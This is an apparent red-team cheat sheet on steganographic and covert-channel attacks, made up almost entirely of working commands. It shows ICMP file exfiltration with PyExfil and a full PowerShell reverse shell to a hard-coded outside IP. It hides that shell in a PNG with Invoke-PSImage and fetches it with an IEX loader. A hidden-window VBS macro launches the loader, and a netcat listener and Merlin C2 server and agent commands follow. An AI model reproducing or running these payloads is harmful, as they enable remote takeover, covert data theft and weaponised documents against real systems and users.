# Stego Red Team

## Data Exfiltration using ICMP 8

* PyExfil: https://github.com/ytisf/PyExfil

* Target: `python -c 'from pyexfil.network.ICMP.icmp_exfiltration import send_file;ip_addr = "127.0.0.1";send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="/home/kali/stego/PyExfil/1.txt", max_packetsize=512, SLEEP=0.1)'`

* Server: `tcpdump -A icmp -i lo`



## Remote Access using PSImage

* PSImage: https://github.com/peewpw/Invoke-PSImage

* `echo '$client = New-Object System.Net.Sockets.TCPClient("46.101.222.52",444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > payload.ps1`
* `Import-Module .\Invoke-PSImage.ps1`
* `Invoke-PSImage -Script .\payload.ps1 -Out .\evil.png -Image .\image.png -Web`
* `sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://46.101.222.52/evil.png"));$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..500]))`
* Create a VBS Macro: 
```
Sub RunAndGetCmd()

    strCommand = "Powershell -W Hidden -Exec Bypass -Command ""sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead('http://46.101.222.52/evil.png'));$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..500]))"""
    Set WshShell = CreateObject("WScript.Shell")
    Set WshShellExec = WshShell.Exec(strCommand)
    strOutput = WshShellExec.StdOut.ReadAll

End Sub
```
* `nc -nlvp 444`



## Post-Exploitation over HTTP/2 C&C

* `./ merlinServer-Linux-x64 -i 46.101.222.52`
* `./ merlinAgent-Linux-x64 -url https://46.101.222.52:443`
 
 
 
## Awsome Tools & Resources

* SpookFlare: https://artofpwn.com/spookflare.html
* Packet Whisper: https://github.com/TryCatchHCF/PacketWhisper
* Merlin: https://github.com/Ne0nd0g/merlin
* Steganography Network: https://github.com/microkost/Steganography-for-IP-networks
* Mindcrypt Repo: https://github.com/mindcrypt
